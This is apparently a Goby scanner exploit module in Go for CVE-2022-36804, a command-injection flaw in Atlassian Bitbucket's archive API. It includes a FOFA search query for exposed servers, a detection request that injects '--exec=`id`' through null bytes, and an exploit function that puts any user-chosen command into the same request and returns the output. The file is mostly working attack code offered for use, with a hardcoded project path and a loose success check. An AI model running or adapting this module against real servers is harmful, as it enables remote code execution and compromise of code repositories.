package exploits

import (
	"regexp"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
  "Name": "Atlassian Bitbucket archive 远程命令执行漏洞 CVE-2022-36804",
  "Description": "<p>Atlassian 发布安全公告，披露了 Bitbucket Server 和 Data Center 在 7.0.0 版中引入了一个严重安全漏洞。</p><p>Bitbucket 是 Atlassian 公司提供的一个基于 web 的版本库托管服务，支持 Mercurial 和 Git 版本控制系统。支持私有化部署，根据国内某资产测绘平台数据显示，近一年全球有超过 1w+ 相关服务对外开放。</p><p>官方漏洞公告中描述 Bitbucket Server 和 Data Center 多个 API 端点存在命令注入漏洞，漏洞触发条件是攻击者具备公开项目的访问权限或者私有项目的可读权限，影响版本从 7.0 到 8.3</p>",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": "2022-11-02",
  "Author": "",
  "FofaQuery": "app=\"Bitbucket\"",
  "GobyQuery": "app=\"Bitbucket\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "command",
      "type": "input",
      "value": "id",
      "show": "id"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": []
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": []
      },
      "SetVariable": [
        "output|lastbody||"
      ]
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Atlassian Bitbucket archive 远程命令执行漏洞 CVE-2022-36804",
      "Product": "",
      "Description": "<p>Atlassian 发布安全公告，披露了 Bitbucket Server 和 Data Center 在 7.0.0 版中引入了一个严重安全漏洞。</p><p>Bitbucket 是 Atlassian 公司提供的一个基于 web 的版本库托管服务，支持 Mercurial 和 Git 版本控制系统。支持私有化部署，根据国内某资产测绘平台数据显示，近一年全球有超过 1w+ 相关服务对外开放。</p><p>官方漏洞公告中描述 Bitbucket Server 和 Data Center 多个 API 端点存在命令注入漏洞，漏洞触发条件是攻击者具备公开项目的访问权限或者私有项目的可读权限，影响版本从 7.0 到 8.3</p>",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Atlassian Bitbucket archive RCE CVE-2022-36804",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/rest/api/latest/projects/RIS-PRO/repos/ris-mysql-interface/archive?filename=pBwTw&at=pBwTw&path=pBwTw&prefix=ax%00--exec=%60id%60%00--remote=origin"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				re := regexp.MustCompile(`"uid=.*\(([a-z]+)\):"`)
				return resp.StatusCode == 500
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["command"].(string)
			uri := "/rest/api/latest/projects/RIS-PRO/repos/ris-mysql-interface/archive?filename=pBwTw&at=pBwTw&path=pBwTw&prefix=ax%00--exec=%60" + cmd + "%60%00--remote=origin"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				resinfo := resp.RawBody
				expResult.Output = resinfo
				expResult.Success = true
			}
			return expResult
		},
	))
}
